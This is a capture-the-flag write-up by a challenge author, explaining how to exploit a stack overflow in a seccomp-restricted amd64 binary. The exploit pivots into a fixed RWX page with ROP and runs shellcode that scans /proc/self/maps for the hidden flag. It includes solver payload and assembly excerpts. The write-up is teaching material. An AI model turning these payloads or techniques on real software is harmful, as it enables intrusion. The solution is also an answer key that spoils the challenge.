---
title: "Who likes assembly anw ?"
area: shellcode
role: author
event: pioneers25
published: 2026-03-20
summary: "The flag sits at a randomized address, so a stack overflow pivots into a fixed RWX page and shellcode scans /proc/self/maps."
techniques: ["stack overflow", "ROP", "shellcode", "seccomp", "/proc/self/maps scan"]
difficulty: hard
arch: amd64
---

## Overview
This binary reads the flag during `setup()`, then hides it in memory by copying it into a large, randomly-mapped RW region at a random offset. A classic stack overflow in `vuln()` gives control of `RIP`, and the program also provides an RWX page at a fixed address (`0x700000`).

The solver’s approach:
1) Use the stack overflow to pivot execution into the fixed RWX page.
2) Use a second `read()` to place custom shellcode into that RWX page.
3) Shellcode opens `/proc/<pid>/maps` or `/proc/self/maps`, finds the randomized mapping base, scans it for the flag, and writes the bytes out.

## Vulnerability analysis

### The flag is copied into a randomized mapping
`setup()` reads the flag file from a hardcoded path into a local buffer, then mmaps a large region at a randomized base and copies the bytes to a randomized offset inside that region:

```c
long int addr = secure_random() << 0x10;
mmap((void*)addr, 0x1000000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
int translate = secure_random();
memcpy((void*)(addr + translate), buf, 90);
```

So you don’t know:
- where the 16MB mapping starts (`addr`)
- where inside it the flag was copied (`translate`)

### A fixed RWX page is provided
Before seccomp is installed, the program maps a page at a fixed address with execute permissions:

```c
mmap((void*)0x700000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
	 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
```

This is a big hint: the intended payload is shellcode living at `0x700000`.

### Stack overflow in `vuln()`
`vuln()` reads 300 bytes into a 32-byte stack buffer:

```c
char buf[32];
read(0, buf, 300);
```

No canary is enabled (`-fno-stack-protector` in the comment), so we can overwrite saved `RIP`.

### Seccomp constraints
After `setup()` finishes, seccomp only allows a small set of syscalls:

```c
ALLOW(write);
ALLOW(read);
ALLOW(lseek);
ALLOW(open);
ALLOW(exit);
ALLOW(exit_group);
ALLOW(getpid);
```

So the shellcode must stick to: `open/read/write/getpid` (exactly what the solver does).

## Exploitation strategy (matches `solve.py`)

### Step 1 — ROP to get execution into the RWX page
The solver first sends a short ROP payload to regain control flow and arrange for a second stage to be read.

Solver excerpt (stage 1):

```python
xpage = 0x700000
payload = (
	b"a"*0x20
	+ p64(0)
	+ p64(poprbp)
	+ p64(xpage + 0x700 + 0x20)
	+ p64(0x401a20 + 8)
	+ p64(xpage + 0x700 - 0x20)
)
p.send(payload)
```

Conceptually, this stage:
- overflows the stack
- uses a stack-pivot gadget (via `rbp`/`leave; ret`-style mechanics) so execution can continue from memory we control (the RWX page)
- reaches a `read()`-like path so the process will block waiting for more bytes (the solver then sends stage 2)

Note: gadget addresses may differ between local/remote builds; the important part is the technique: pivot into `0x700000` and trigger a read for the shellcode.

### Step 2 — Send shellcode into the RWX page and jump to it
Solver excerpt (stage 2):

```python
payload2  = b"a"*0x28
payload2 += p64(xpage + 0x700 + 0x30)
payload2 += shellcode
p.send(payload2)
```

This places the assembled shellcode into the executable page and transfers control to it.

### Step 3 — Shellcode: locate the randomized mapping via `/proc/<pid>/maps`
Because the flag lives in an anonymous RW mapping at a randomized base, the shellcode reads the process memory map.

Key solver shellcode excerpts:

Get PID (allowed by seccomp):

```asm
mov rax, 39      ; getpid
syscall
```

Open `/proc/<pid>/maps` (also allowed):

```asm
mov rax, 2       ; open
syscall
```

Parse the first mapping address from the maps content as a hex value (loop building a number nibble-by-nibble), then scan a full 16MB region:

```asm
; rax = parsed base
mov r15, rax
add r15, 0x1000000
mov rsi, rax

scan_loop:
	; iterate rsi from base .. base+0x1000000
	mov cl, byte [rsi]
	cmp cl, 'P'
	je  found
	inc rsi
	jmp scan_loop
```

Finally, on a match it uses `write(1, ...)` to print bytes following the marker (the flag is expected to contain a recognizable starting byte like `'P'` in the author’s setup).

## Result
The exploit never needs libc leaks or ROP-to-libc:
- the program itself provides an RWX landing pad
- seccomp is permissive enough for `/proc/<pid>/maps`
- scanning memory bypasses the “randomized flag address + offset” trick
